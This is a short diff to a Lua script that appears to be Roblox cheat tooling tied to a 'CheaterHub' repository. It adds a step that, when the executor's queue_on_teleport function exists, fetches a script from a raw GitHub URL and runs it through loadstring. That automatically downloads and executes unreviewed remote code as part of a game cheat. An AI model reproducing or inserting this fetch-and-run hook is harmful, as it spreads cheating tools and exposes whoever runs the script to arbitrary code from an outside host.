@@ -159,3 +159,7 @@ end
 button.MouseButton1Click:Connect(function()
 	task.spawn(FindServer)
 end)
+
+if queue_on_teleport then
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter-coder/CheaterHub/refs/heads/main/Join1Player.lua"))()
+end
